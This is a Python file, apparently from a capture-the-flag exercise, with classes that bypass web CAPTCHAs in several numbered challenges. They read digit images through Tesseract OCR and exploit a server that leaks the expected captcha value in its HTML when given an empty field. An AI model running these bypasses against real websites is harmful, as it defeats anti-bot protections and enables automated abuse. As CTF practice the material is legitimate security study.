import platform
import re
from abc import ABC, abstractmethod
from io import BytesIO
from urllib.parse import urlparse

import requests
from PIL import Image, ImageOps
import pytesseract

if platform.system() == "Windows":
    pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

_TESSERACT_CONFIG = "--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789"
_CAPTCHA_DIGITS = 6
_MAX_RETRIES = 10


class Captcha(ABC):
    """
    Classe abstraite représentant un captcha à résoudre.
    Chaque challenge hérite de cette classe et implémente
    sa propre stratégie de bypass.
    """

    def __init__(self, url: str, session: requests.Session | None = None):
        self.url = url
        self.value = ""
        self._session = session or requests.Session()
        parsed = urlparse(url)
        self._base_url = f"{parsed.scheme}://{parsed.netloc}"

    @abstractmethod
    def capture(self) -> None:
        """
        Récupère le captcha (image, réponse serveur, etc.)
        """

    @abstractmethod
    def solve(self) -> None:
        """
        Résout le captcha et stocke la valeur dans self.value
        """

    def get_value(self) -> str:
        return self.value


class CaptchaOCR(Captcha):
    """
    Challenge 1 & 3 — Bypass par OCR (pytesseract).
    Le captcha est une image PNG de 6 chiffres.

    Technique :
    - Isoler le canal Rouge (fond bleu R≈22, texte blanc R≈255)
    - Inverser + upscale x4 pour maximiser le contraste
    - Retenter si le résultat n'est pas exactement 6 chiffres
    """

    def __init__(self, url: str, session: requests.Session | None = None):
        super().__init__(url, session)
        self._captcha_url = f"{self._base_url}/captcha.php"
        self._image: Image.Image | None = None

    def capture(self) -> None:
        response = self._session.get(self._captcha_url)
        response.raise_for_status()
        self._image = Image.open(BytesIO(response.content))

    def solve(self) -> None:
        if self._image is None:
            raise RuntimeError("capture() doit être appelé avant solve()")

        for attempt in range(_MAX_RETRIES):
            if attempt > 0:
                self.capture()

            raw = self._ocr(self._image)
            if len(raw) == _CAPTCHA_DIGITS:
                self.value = raw
                return

        raise RuntimeError(
            f"Impossible de lire le captcha après {_MAX_RETRIES} tentatives"
        )

    def _ocr(self, img: Image.Image) -> str:
        r_inv = ImageOps.invert(img.split()[0])
        upscaled = r_inv.resize((img.width * 4, img.height * 4), Image.LANCZOS)
        return pytesseract.image_to_string(upscaled, config=_TESSERACT_CONFIG).strip()


class CaptchaLeak(Captcha):
    """
    Challenge 2 — Bypass par information disclosure.
    Le serveur leak la vraie valeur du captcha dans le HTML
    quand on soumet avec captcha=''.

    Technique :
    - POST avec captcha vide → le HTML contient la valeur attendue
    - Extraire avec regex et la réutiliser pour le vrai submit
    """

    def __init__(self, url: str, session: requests.Session | None = None):
        super().__init__(url, session)
        self._leak_response: str = ""

    def capture(self) -> None:
        resp = self._session.post(
            self.url,
            data={"flag": "", "captcha": "", "submit": "Submit"},
        )
        resp.raise_for_status()
        self._leak_response = resp.text

    def solve(self) -> None:
        match = re.search(r"([0-9a-f]{4,})</div>", self._leak_response)
        if not match:
            raise RuntimeError("Impossible d'extraire le captcha depuis le HTML")
        self.value = match.group(1)

class CaptchaEmpty(Captcha):
    """
    Challenge 4 — Premier pass sans captcha.
    Le formulaire initial ne montre pas de captcha ;
    il faut soumettre le flag une première fois pour le révéler.
    La vraie validation OCR se fait ensuite via CaptchaOCR.
    """

    def capture(self) -> None:
        pass

    def solve(self) -> None:
        self.value = ""